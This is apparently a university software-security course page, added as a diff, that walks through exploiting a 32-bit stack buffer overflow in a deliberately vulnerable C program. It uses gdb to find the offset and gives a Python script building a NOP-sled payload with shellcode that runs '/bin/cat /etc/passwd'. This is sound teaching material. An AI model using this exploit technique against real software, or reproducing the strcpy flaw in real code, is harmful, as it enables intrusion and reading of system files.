@@ -1,0 +1,161 @@
+---
+layout: ../../../layouts/SemesterMarkdown.astro
+---
+
+import { Image } from "astro:assets";
+import pattern_create from "@/images/notes/shellcode-gdb-pattern-create.png";
+import gdb_crash from "@/images/notes/shellcode-gdb-crash.png";
+import gdb_pattern_search from "@/images/notes/shellcode-gdb-pattern-search.png";
+import gdb_find_address from "@/images/notes/shellcode-find-address.png";
+import shellcode_done from "@/images/notes/shellcode-done.png";
+
+# Shellcode walkthrough
+
+We're going to be walking through an example of using an x32 shellcode.
+
+## Vulnerable code
+
+Here is the vulnerable code we'll be using. This is taken from `stack-overflow.c` in the `shellcode32` directory in the [software security repo](https://github.com/BYU-CS465/software-security).
+
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void my_function(const char *);
+
+int main(int argc, char **argv)
+{
+  char buf[1000];
+
+  printf("Enter a string: ");
+  fgets(buf, 999, stdin);
+
+  my_function(buf);
+
+  printf("Exiting normally\n");
+}
+
+void my_function(const char *src)
+{
+  char copy[500];
+  strcpy(copy, src);
+}
+```
+
+As you can see, the code has a 500-byte buffer that is the destination for `strcpy()`, but input in `main()` enables an attacker to enter 999 bytes.
+
+## Finding the stack pointer offset
+
+Run `gdb ./stack` and then generate a pattern: `pattern create`:
+
+<Image alt="Using the pattern create command in gdb" src={pattern_create} />
+
+Now run the program and supply the pattern as input:
+
+<Image alt="Crash output from gdb" src={gdb_crash} />
+
+- The top listing shows you registers, color-coded to show you which are affected by what we wrote on the stack.
+
+  - Notice that we can overwrite `$esp`, the stack pointer
+  - Notice that we changed `$eip`, the instruction pointer.
+
+- The bottom listing shows you the stack.
+
+Now run `pattern search daafeaaf`:
+
+<Image alt="Use the pattern search command in gdb" src={gdb_pattern_search} />
+
+You should see the offset from the buffer to `$esp`, which in this case is 512.
+
+## Shellcode
+
+You can use [Exploit Databse](https://www.exploit-db.com/) to find shellcode. I chose [Linux/x86 - execve(/bin/cat /etc/passwd)](https://www.exploit-db.com/shellcodes/13609), which is 43 bytes.
+
+> Note, I originally used shellcode that ran `/bin/sh`, but the shell exits when the program exits so it doesn't do much useful
+
+You can put the offset and the shellcode into `shell.py`:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# shellcode
+# cat /etc/passwd
+# length of shellcode is 43 bytes
+SHELL = 43
+shellcode32 = b'\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80'
+
+# calculate this offset in gdb
+OFFSET = 512
+
+NUM = OFFSET - SHELL - 40
+
+nop = b'\x90' * NUM
+
+# find this address by examining the stack after strcpy()
+# eip
+
+# use for checking which address to use
+eip = b'\x43\x43\x43\x43' * 10
+
+payload = nop + shellcode32 + eip
+
+sys.stdout.buffer.write(payload)
+print()
+```
+
+This program will create a payload tht contains a nop sled, followed by the shellcode, followed by 10 copies of a bad address (capital C). Our goal is to find a good address to overwrite $esp, and this will help us do it.
+
+Create the payload with `python shell.py > payload.txt`
+
+## Finding an address for the exploit
+
+Use `gdb` and run `r < payload.txt`:
+
+<Image alt="Find the address" src={gdb_find_address} />
+
+What we want is an address that is in our nop sled, which is the list of `\x90` instructions on the stack. Let's use `0xffffcec0`. Modify the script so it uses this
+address:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# shellcode
+# cat /etc/passwd
+# length of shellcode is 43 bytes
+SHELL = 43
+shellcode32 = b'\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\
+\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80'
+
+# calculate this offset in gdb
+OFFSET = 512
+
+NUM = OFFSET - SHELL - 40
+
+nop = b'\x90' * NUM
+
+# find this address by examining the stack after strcpy()
+eip = b'\xc0\xce\xff\xff' * 10
+
+# use for checking which address to use
+# eip = b'\x43\x43\x43\x43' * 10
+
+payload = nop + shellcode32 + eip
+
+sys.stdout.buffer.write(payload)
+print()
+```
+
+Generate a new payload with `python shell.py > payload.txt`.
+
+## Running the exploit
+
+Now we can run this in gdb with `r < payload.txt>`:
+
+<Image alt="It works!" src={shellcode_done} />
+
+It works!
+
+You can also run this exploit on the command line with `./stack < payload.txt`.
